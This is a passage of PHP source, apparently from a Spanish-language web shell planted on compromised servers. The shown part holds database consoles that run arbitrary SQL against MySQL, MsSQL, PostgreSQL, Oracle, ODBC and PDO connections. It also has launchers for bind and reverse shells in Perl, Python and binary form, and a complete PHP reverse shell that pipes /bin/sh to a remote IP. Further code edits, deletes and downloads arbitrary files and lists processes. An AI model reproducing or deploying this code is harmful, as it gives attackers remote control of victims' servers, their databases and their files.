						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=1;$i<=oci_num_fields($st);$i++)
							$q_result .= "<th>".htmlspecialchars(oci_field_name($st,$i))."</th>";
					
						$q_result .= "</tr>";
					
						while($rows=oci_fetch_array($st)){
							$q_result .= "<tr>";
							for($j=0;$j<oci_num_fields($st);$j++)
							{
								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
			else $sqls = "SELECT * FROM user_tablespaces;";

			$s_result .= "	<form action=\"?db\" method=\"post\">
					<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
					<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
					<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
					<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
					<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
					<textarea id=\"sqlcode\" name=\"sqlcode\" class=\"evalcode\" style=\"height:10em;\">".$sqls."</textarea>
					<p><input type=\"submit\" name=\"oraclecon\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;\" />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class=\"gaya\">[</span> ; <span class=\"gaya\">]</span></p>
					</form>";
			$s_result .= "<div>".$q_result."</div>";
			if($con) oci_close($con);
		}
		elseif(isset($_REQUEST['pgsqlcon']) && ($con = pg_connect("host=$sqlhost user=$sqluser password=$sqlpass port=$sqlport"))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$hasil = pg_query($query);
					if($hasil){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=0;$i<pg_num_fields($hasil);$i++)
							$q_result .= "<th>".htmlspecialchars(pg_field_name($hasil,$i))."</th>";
						$q_result .= "</tr>";
					
						while($rows=pg_fetch_array($hasil)){
							$q_result .= "<tr>";
							for($j=0;$j<pg_num_fields($hasil);$j++)
							{
								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
		}
		elseif(isset($_REQUEST['odbccon']) && ($con = odbc_connect($odbcdsn,$odbcuser,$odbcpass))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$hasil = odbc_exec($con, $query);
					if($hasil){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=1;$i<=odbc_num_fields($hasil);$i++)
							$q_result .= "<th>".htmlspecialchars(odbc_field_name($hasil,$i))."</th>";
						$q_result .= "</tr>";
					
						while($rows=odbc_fetch_array($hasil)){
							$q_result .= "<tr>";
							foreach($rows as $r)
							{
								if($r == "") $dataz = " ";
								else $dataz = $r;
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}		
			else $sqls = "";

			$s_result .= "	<form action=\"?db\" method=\"post\">
					<input type=\"hidden\" name=\"odbcdsn\" value=\"".$odbcdsn."\" />
					<input type=\"hidden\" name=\"odbcuser\" value=\"".$odbcuser."\" />
					<input type=\"hidden\" name=\"odbcpass\" value=\"".$odbcpass."\" />
					<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
					<textarea id=\"sqlcode\" name=\"sqlcode\" class=\"evalcode\" style=\"height:10em;\">".$sqls."</textarea>
					<p><input type=\"submit\" name=\"odbccon\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;\" />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class=\"gaya\">[</span> ; <span class=\"gaya\">]</span></p>
					</form>";
			$s_result .= "<div>".$q_result."</div>";
			if($con) odbc_close($con);
		}
		else{
			if(isset($_REQUEST['pdocon'])){
				try{
					// create object
					$mypdo = new PDO($pdodsn,$pdouser,$pdopass);		
					if(isset($_REQUEST['sqlcode'])){
						$sqls = ss($_REQUEST['sqlcode']);
						$querys = explode(";",$sqls);

						foreach($querys as $query){
							if(trim($query) != ""){

								if($hasil = $mypdo->query($query)){
									$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
									<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
									<table class=\"explore\" style=\"width:99%;\"><tr>";
									// workaround to get column name
									$r = $hasil->fetch(PDO::FETCH_ASSOC);
									$savefirstrow = array();
									foreach($r as $fn=>$fv){
										$q_result .= "<th>".htmlspecialchars($fn)."</th>";
										$savefirstrow[] = $fv;
									}
									$q_result .= "</tr><tr>";
									foreach($savefirstrow as $fv){
										$q_result .= "<td>".htmlspecialchars($fv)."</td>";
									}
									$q_result .= "</tr>";
									while($rows = $hasil->fetch(PDO::FETCH_ASSOC)){
										$q_result .= "<tr>";
										foreach($rows as $r)
										{
											if($r == "") $dataz = " ";
											else $dataz = $r;
											$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
										}
										$q_result .= "</tr>";
									}	
									$q_result .= "</table>";	
								}
								else{

									$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
											<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
								}

								$q_result .= "</table>";
							}
						}
					}		
					else $sqls = "";
				
					$s_result .= "	<form action=\"?db\" method=\"post\">
						<input type=\"hidden\" name=\"pdodsn\" value=\"".$pdodsn."\" />
						<input type=\"hidden\" name=\"pdouser\" value=\"".$pdouser."\" />
						<input type=\"hidden\" name=\"pdopass\" value=\"".$pdopass."\" />
						<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
						<textarea id=\"sqlcode\" name=\"sqlcode\" class=\"evalcode\" style=\"height:10em;\">".$sqls."</textarea>
						<p><input type=\"submit\" name=\"pdocon\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;\" />
						&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class=\"gaya\">[</span> ; <span class=\"gaya\">]</span></p>
						</form>";
						$s_result .= "<div>".$q_result."</div>";				
				}	
				catch (PDOException $uck) {
					// do nothing... lazy
				}			
			}
			else{
				// mysql
				$s_result .= "<div class=\"mybox\"><h2>Conectarse con MySQL Server</h2>
				<form action=\"?db\" method=\"post\" />
				<table class=\"myboxtbl\">
				<tr><td style=\"width:120px;\">Host</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlhost1\" value=\"".$sqlhost1."\" /></td></tr>
				<tr><td>Usuario</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqluser1\" value=\"".$sqluser1."\" /></td></tr>
				<tr><td>Contraseña</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"password\" name=\"sqlpass1\" value=\"\" /></td></tr>
				<tr><td>Puerto (opcional)</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlport1\" value=\"".$sqlport1."\" /></td></tr>
				</table>
				<input type=\"submit\" name=\"mysqlcon\" class=\"inputzbut\" value=\"Connect !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
				</form>
				</div>";
				// mssql
				$s_result .= "<div class=\"mybox\"><h2>Conectarse a MsSQL</h2>
				<form action=\"?db\" method=\"post\" />
				<table class=\"myboxtbl\">
				<tr><td style=\"width:120px;\">Host</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlhost2\" value=\"".$sqlhost2."\" /></td></tr>
				<tr><td>Usuario</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqluser2\" value=\"".$sqluser2."\" /></td></tr>
				<tr><td>Contraseña</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"password\" name=\"sqlpass2\" value=\"\" /></td></tr>
				<tr><td>Puerto (opcional)</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlport2\" value=\"".$sqlport2."\" /></td></tr>
				</table>
				<input type=\"submit\" name=\"mssqlcon\" class=\"inputzbut\" value=\"Connect !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
				</form>
				</div>";

				// postgresql
				$s_result .= "<div class=\"mybox\"><h2>Conectarse a PostgreSQL</h2>
				<form action=\"?db\" method=\"post\" />
				<table class=\"myboxtbl\">
				<tr><td style=\"width:120px;\">Host</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlhost3\" value=\"".$sqlhost3."\" /></td></tr>
				<tr><td>Usuario</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqluser3\" value=\"".$sqluser3."\" /></td></tr>
				<tr><td>Contraseña</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"password\" name=\"sqlpass3\" value=\"\" /></td></tr>
				<tr><td>Puerto (opcional)</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlport3\" value=\"".$sqlport3."\" /></td></tr>
				</table>
				<input type=\"submit\" name=\"pgsqlcon\" class=\"inputzbut\" value=\"Connect !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
				<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
				</form>
				</div>";

				// oracle
				$s_result .= "<div class=\"mybox\"><h2>Conectarse a Oracle</h2>
				<form action=\"?db\" method=\"post\" />
				<table class=\"myboxtbl\">
				<tr><td style=\"width:120px;\">Host</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlhost4\" value=\"".$sqlhost4."\" /></td></tr>
				<tr><td>Usuario</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqluser4\" value=\"".$sqluser4."\" /></td></tr>
				<tr><td>Contraseña</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"password\" name=\"sqlpass4\" value=\"\" /></td></tr>
				<tr><td>Puerto (opcional)</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlport4\" value=\"".$sqlport4."\" /></td></tr>
				</table>
				<input type=\"submit\" name=\"oraclecon\" class=\"inputzbut\" value=\"Connect !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
				<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
				</form>
				</div>";
						
				// odbc
				$s_result .= "<div class=\"mybox\"><h2>Conectarse usando ODBC</h2>
				<form action=\"?db\" method=\"post\" />
				<table class=\"myboxtbl\">
				<tr><td style=\"width:120px;\">DSN / Connection String</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"odbcdsn\" value=\"".$odbcdsn."\" /></td></tr>
				<tr><td>Usuario</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"odbcuser\" value=\"".$odbcuser."\" /></td></tr>
				<tr><td>Contraseña</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"password\" name=\"odbcpass\" value=\"\" /></td></tr>
				</table>
				<input type=\"submit\" name=\"odbccon\" class=\"inputzbut\" value=\"Connect !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
				<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
				</form>
				</div>";
						
				// pdo
				$s_result .= "<div class=\"mybox\"><h2>Conectarse usando PDO</h2>
				<form action=\"?db\" method=\"post\" />
				<table class=\"myboxtbl\">
				<tr><td style=\"width:120px;\">DSN / Connection String</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"pdodsn\" value=\"".$pdodsn."\" /></td></tr>
				<tr><td>Usuario</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"pdouser\" value=\"".$pdouser."\" /></td></tr>
				<tr><td>Contraseña</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"password\" name=\"pdopass\" value=\"\" /></td></tr>
				</table>
				<input type=\"submit\" name=\"pdocon\" class=\"inputzbut\" value=\"Connect !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
				<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
				</form>
				</div>";
			}
		}
	} // bind and reverse shell
	elseif(isset($_REQUEST['rs'])){
		$rshost = $s_server_ip;
		$rstarget = "";
		$d = $pwd;
		if(isset($_REQUEST['d'])) $d = ss($_REQUEST['d']);

		$rsport = "133";
		// resources $xback_pl $xbind_pl $xback_c $xbind_c $xmulti_py $wmulti_c
		$rspesan = "Preciona &#39;  Ir !  &#39; para Ejecutar &#39;  nc <i>server_ip</i> <i>port</i>  &#39; en tu pc";
		$rspesanb = "Ejecutar &#39;  nc -l -v -p <i>port</i>  &#39; En tu computador presiona &#39;  Ir !  &#39; Boton";

		$rsport1 = $rsport;
		$rsport2 = $rsport;
		$rsport3 = $rsport;

		if(isset($_REQUEST['xbind_pl'])){
			if(isset($_REQUEST['sqlport1'])) $rsport1 = ss($_REQUEST['sqlport1']);
			$rstarget = $rsport1;
			$rsres = rs($s_win, cp($d),  "xbind_pl" ,$xbind_pl, $rstarget);
			$s_result .= $rsres;
		}
		if(isset($_REQUEST['xbind_py'])){
			if(isset($_REQUEST['sqlport2'])) $rsport2 = ss($_REQUEST['sqlport2']);
			$rstarget = $rsport2;
			$rsres = rs($s_win, cp($d),  "xbind_py" ,$xmulti_py, $rstarget);
			$s_result .= $rsres;
		}
		if(isset($_REQUEST['xbind_bin'])){
			if(isset($_REQUEST['sqlport3'])) $rsport3 = ss($_REQUEST['sqlport3']);
			$rstarget = $rsport3;
			if(!$s_win) $rsres = rs($s_win, cp($d),  "xbind_bin" ,$xbind_c, $rstarget);
			else $rsres = rs($s_win, cp($d),  "xbind_bin" ,$wmulti_c, $rstarget);
			$s_result .= $rsres;
		}

		$rsportb1 = $rsport;
		$rsportb2 = $rsport;
		$rsportb3 = $rsport;
		$rsportb4 = $rsport;
		$rstarget1 = $s_my_ip;
		$rstarget2 = $s_my_ip;
		$rstarget3 = $s_my_ip;
		$rstarget4 = $s_my_ip;

		if(isset($_REQUEST['xback_pl'])){
			if(isset($_REQUEST['sqlportb1'])) $rsportb1 = ss($_REQUEST['sqlportb1']);
			if(isset($_REQUEST['rstarget1'])) $rstarget1 = ss($_REQUEST['rstarget1']);

			$rstarget = $rsportb1."  ".$rstarget1;
			$rsres = rs($s_win, cp($d),  "xback_pl" ,$xback_pl, $rstarget);
			$s_result .= $rsres;

		}
		if(isset($_REQUEST['xback_py'])){
			if(isset($_REQUEST['sqlportb2'])) $rsportb2 = ss($_REQUEST['sqlportb2']);
			if(isset($_REQUEST['rstarget2'])) $rstarget2 = ss($_REQUEST['rstarget2']);

			$rstarget = $rsportb2."  ".$rstarget2;
			$rsres = rs($s_win, cp($d),  "xback_py" ,$xmulti_py, $rstarget);
			$s_result .= $rsres;
		}
		if(isset($_REQUEST['xback_bin'])){
			if(isset($_REQUEST['sqlportb3'])) $rsportb3 = ss($_REQUEST['sqlportb3']);
			if(isset($_REQUEST['rstarget3'])) $rstarget3 = ss($_REQUEST['rstarget3']);

			$rstarget = $rsportb3."  ".$rstarget3;
			if(!$s_win) $rsres = rs($s_win, cp($d),  "xback_bin" ,$xback_c, $rstarget);
			else $rsres = rs($s_win, cp($d),  "xback_bin" ,$wmulti_c, $rstarget);
			$s_result .= $rsres;
		}
		if(isset($_REQUEST['xback_php'])){
			if(isset($_REQUEST['sqlportb4'])) $rsportb4 = ss($_REQUEST['sqlportb4']);
			if(isset($_REQUEST['rstarget4'])) $rstarget4 = ss($_REQUEST['rstarget4']);
				$ip = $rstarget4;
				$port = $rsportb4;
				$chunk_size = 1337;
				$write_a = null;
				$error_a = null;
				$shell = '/bin/sh';
				$daemon = 0;
				$debug = 0;
				if(function_exists('pcntl_fork')){
					$pid = pcntl_fork();
					if ($pid == -1) exit(1);
					if ($pid) exit(0);
					if (posix_setsid() == -1) exit(1);
					$daemon = 1;
				}
				umask(0);
				$sock = fsockopen($ip, $port, $errno, $errstr, 30);
				if(!$sock) exit(1);
				$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
				$process = proc_open($shell, $descriptorspec, $pipes);
				if(!is_resource($process)) exit(1);
				stream_set_blocking($pipes[0], 0);
				stream_set_blocking($pipes[1], 0);
				stream_set_blocking($pipes[2], 0);
				stream_set_blocking($sock, 0);
				while(1){
					if(feof($sock)) break;
					if(feof($pipes[1])) break;
					$read_a = array($sock, $pipes[1], $pipes[2]);
					$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
					if(in_array($sock, $read_a)){
						$input = fread($sock, $chunk_size);
						fwrite($pipes[0], $input);
					}
					if(in_array($pipes[1], $read_a)){
						$input = fread($pipes[1], $chunk_size);
						fwrite($sock, $input);
					}
					if(in_array($pipes[2], $read_a)){
						$input = fread($pipes[2], $chunk_size);
						fwrite($sock, $input);
					}
				}
				fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);
				proc_close($process);
			$rsres = " ";
			$s_result .= $rsres;
		}
		$s_result .= "<div class=\"mybox\"><h2>Bind shell ( perl )</h2>
		<form action=\"?rs\" method=\"post\" />
		<table class=\"myboxtbl\">
		<tr><td style=\"width:100px;\">IP del servidor</td><td><input disabled=\"disabled\" style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"rshost1\" value=\"".$rshost."\" /></td></tr>
		<tr><td>Puerto</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlport1\" value=\"".$rsport1."\" /></td></tr>
		</table>
		<input type=\"submit\" name=\"xbind_pl\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
		&nbsp;&nbsp;<span id=\"rs1\">".$rspesan."</span>
		<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
		</form>
		</div>";
		$s_result .= "<div class=\"mybox\"><h2>Bind shell ( python )</h2>
		<form action=\"?rs\" method=\"post\" />
		<table class=\"myboxtbl\">
		<tr><td style=\"width:100px;\">IP del servidor</td><td><input disabled=\"disabled\" style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"rshost\" value=\"".$rshost."\" /></td></tr>
		<tr><td>Puerto</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlport2\" value=\"".$rsport2."\" /></td></tr>
		</table>
		<input type=\"submit\" name=\"xbind_py\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
		&nbsp;&nbsp;<span id=\"rs1\">".$rspesan."</span>
		<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
		</form>
		</div>";
		$s_result .= "<div class=\"mybox\"><h2>Bind shell ( bin )</h2>
		<form action=\"?rs\" method=\"post\" />
		<table class=\"myboxtbl\">
		<tr><td style=\"width:100px;\">IP del servidor</td><td><input disabled=\"disabled\" style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"rshost\" value=\"".$rshost."\" /></td></tr>
		<tr><td>Puerto</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlport3\" value=\"".$rsport3."\" /></td></tr>
		</table>
		<input type=\"submit\" name=\"xbind_bin\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
		&nbsp;&nbsp;<span id=\"rs1\">".$rspesan."</span>
		<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
		</form>
		</div>";
		$s_result .= "<div class=\"mybox\"><h2>Reverse shell ( perl )</h2>
		<form action=\"?rs\" method=\"post\" />
		<table class=\"myboxtbl\">
		<tr><td style=\"width:100px;\">Your IP</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"rstarget1\" value=\"".$rstarget1."\" /></td></tr>
		<tr><td>Puerto</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlportb1\" value=\"".$rsportb1."\" /></td></tr>
		</table>
		<input type=\"submit\" name=\"xback_pl\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
		&nbsp;&nbsp;<span id=\"rs1\">".$rspesanb."</span>
		<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
		</form>
		</div>";
		$s_result .= "<div class=\"mybox\"><h2>Reverse shell ( python )</h2>
		<form action=\"?rs\" method=\"post\" />
		<table class=\"myboxtbl\">
		<tr><td style=\"width:100px;\">Your IP</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"rstarget2\" value=\"".$rstarget2."\" /></td></tr>
		<tr><td>Puerto</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlportb2\" value=\"".$rsportb2."\" /></td></tr>
		</table>
		<input type=\"submit\" name=\"xback_py\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
		&nbsp;&nbsp;<span id=\"rs1\">".$rspesanb."</span>
		<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
		</form>
		</div>";
		$s_result .= "<div class=\"mybox\"><h2>Reverse shell ( bin )</h2>
		<form action=\"?rs\" method=\"post\" />
		<table class=\"myboxtbl\">
		<tr><td style=\"width:100px;\">Your IP</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"rstarget3\" value=\"".$rstarget3."\" /></td></tr>
		<tr><td>Puerto</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlportb3\" value=\"".$rsportb3."\" /></td></tr>
		</table>
		<input type=\"submit\" name=\"xback_bin\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
		&nbsp;&nbsp;<span id=\"rs1\">".$rspesanb."</span>
		<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
		</form>
		</div>";
		$s_result .= "<div class=\"mybox\"><h2>Reverse shell ( php )</h2>
		<form action=\"?rs\" method=\"post\" />
		<table class=\"myboxtbl\">
		<tr><td style=\"width:100px;\">Your IP</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"rstarget4\" value=\"".$rstarget4."\" /></td></tr>
		<tr><td>Puerto</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlportb4\" value=\"".$rsportb4."\" /></td></tr>
		</table>
		<input type=\"submit\" name=\"xback_php\" class=\"inputzbut\" value=\"Ir !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
		&nbsp;&nbsp;<span id=\"rs1\">".$rspesanb."</span>
		<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
		</form>
		</div>";
	} // view file
	elseif(isset($_REQUEST['view'])){
		$f = ss($_REQUEST['view']);
		if(isset($fnew) && (trim($fnew)!="")) $f = $fnew; 

		if(is_file($f)){
			if(!$s_win && $s_posix){
				$name=posix_getpwuid(fileowner($f));
				$group=posix_getgrgid(filegroup($f));
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
			}
			else {
				$owner = $s_user;
			}
			$filn = basename($f);
			$s_result .= "<table class=\"viewfile\">
			<tr><td>Nombre de archivo</td><td><span id=\"".cs($filn)."_link\">".$f."</span>
			<form action=\"?d=".$pwd."&amp;view=".$f."\" method=\"post\" id=\"".cs($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
				<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" />
				<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" />
				<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
				<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\"
				onclick=\"tukar('".cs($filn)."_link','".cs($filn)."_form');\" />
			</form>
			</td></tr>
			<tr><td>Tamaño</td><td>".gs($f)."</td></tr>
			<tr><td>Permisos</td><td>".gp($f)."</td></tr>
			<tr><td>Grupo</td><td>".$owner."</td></tr>
			<tr><td>Tiempo de creacion</td><td>".date("d-M-Y H:i",filectime($f))."</td></tr>
			<tr><td>Ultima modificacion</td><td>".date("d-M-Y H:i",filemtime($f))."</td></tr>
			<tr><td>Ultimo Acceso</td><td>".date("d-M-Y H:i",fileatime($f))."</td></tr>
			<tr><td>Accion</td><td>
			<a href=\"?d=".$pwd."&amp;edit=".$f."\">Editar</a> |
			<a href=\"javascript:tukar('".cs($filn)."_link','".cs($filn)."_form');\">Renombrar</a> |
			<a href=\"?d=".$pwd."&amp;delete=".$f."\">Borrar</a> |
			<a href=\"?d=".$pwd."&amp;dl=".$f."\">Bajar</a>&nbsp;(<a href=\"?d=".$pwd."&amp;dlgzip=$f\">Zip</a>)</td></tr>
			<tr><td>Ver</td><td>
			<a href=\"?d=".$pwd."&amp;view=".$f."&amp;type=text\">Texto</a> |
			<a href=\"?d=".$pwd."&amp;view=".$f."&amp;type=code\">Codigo</a> |
			<a href=\"?d=".$pwd."&amp;view=".$f."&amp;type=image\">Imagen</a></td></tr>
			</table>
			";
			$t = "";
			$iinfo = getimagesize($f);
			if(substr($filn,-3,3) == "php") $t = "code";
			if(is_array($iinfo)) $t = 'image';

			if(isset($_REQUEST['type'])) $t = ss($_REQUEST['type']);

			if($t=="image"){
				$width = (int) $iinfo[0];
				$height = (int) $iinfo[1];
				$imginfo = "Image type = ( ".$iinfo['mime']." )<br />
					Image Size = <span class=\"gaul\">( </span>".$width." x ".$height."<span class=\"gaul\"> )</span><br />";
				if($width > 800){
					$width = 800;
					$imglink = "<p><a href=\"?d=".$pwd."&amp;img=".$filn."\" target=\"_blank\">
					<span class=\"gaul\">[ </span>view full size<span class=\"gaul\"> ]</span></a></p>";
				}
				else $imglink = "";

				$s_result .= "<div class=\"viewfilecontent\" style=\"text-align:center;\">".$imglink."
					<img width=\"".$width."\" src=\"?d=".$pwd."&amp;img=".$filn."\" alt=\"\" style=\"margin:8px auto;padding:0;border:0;\" /></div>";

			}
			elseif($t=="code"){
				$s_result .= "<div class=\"viewfilecontent\">";
				$file = wordwrap(file_get_contents($f),"240","\n");
				$buff = highlight_string($file,true);
				$old = array("0000BB","000000","FF8000","DD0000", "007700");
				$new = array("4C83AF","888888", "87DF45", "EEEEEE" , "FF8000");
				$buff = str_replace($old,$new, $buff);
				$s_result .= $buff;
				$s_result .=  "</div>";
			}
			else {
				$s_result .= "<div class=\"viewfilecontent\">";
				$s_result .=  nl2br(htmlentities((file_get_contents($f))));
				$s_result .=   "</div>";
			}
		}
		elseif(is_dir($f)){
			chdir($f);
			$pwd = cp(getcwd());
			$s_result .= showdir($pwd,$s_prompt,$s_win);
		}

	} // edit file
	elseif(isset($_REQUEST['edit'])){
		$f = ss($_REQUEST['edit']);
		$fc = "";
		$fcs = "";

		if(is_file($f))	$fc = file_get_contents($f);
		if(isset($_REQUEST['fcsubmit'])){
			$fc = ssc($_REQUEST['fc']);
			if($filez = fopen($f,"w")){
				$time = date("d-M-Y H:i",time());
				if(fwrite($filez,$fc)) $fcs = "file saved <span class=\"gaya\">@</span> ".$time;
				else $fcs = "Error al guardar :(";
				fclose($filez);
			}
			else $fcs = "No tienes permisos para guardar ";
		}
		$s_result .= "	<form action=\"?\" method=\"post\">
				<textarea id=\"fc\" name=\"fc\" class=\"evalcode\">".htmlspecialchars($fc)."</textarea>
				<p><input type=\"text\" class=\"inputz\" style=\"width:98%;\" name=\"edit\" value=\"".$f."\" /></p>
				<p><input type=\"submit\" name=\"fcsubmit\" class=\"inputzbut\" value=\"Guardar :)\" style=\"width:120px;height:30px;\" />
				&nbsp;&nbsp;".$fcs."</p>
				<input type=\"hidden\" name=\"d\" value=\"".$pwd."\" />
				</form>
							";

	} // task manager
	elseif(isset($_REQUEST['ps'])){
		$s_result = "<table class=\"explore sortable\">";
		if(!$s_win) $h = "ps -aux";
		else $h = "tasklist /V /FO csv";
		$wcount = 11;
		$wexplode = " ";
		if($s_win) $wexplode = "\",\"";


		$res = exe($h);
		if(trim($res)=='') $s_result .= "<p class=\"rs_result\">error: permission denied</p>";
		else{
			if(!$s_win) $res = preg_replace('#\ +#',' ',$res);

			$psarr = explode("\n",$res);
			$fi = true;
			$tblcount = 0;

			$check = explode($wexplode,$psarr[0]);
			$wcount = count($check);

			foreach($psarr as $psa){
				if(trim($psa)!=''){
					if($fi){
						$fi = false;
						$psln = explode($wexplode,$psa,$wcount);
						$s_result .= "<tr><th>action</th>";
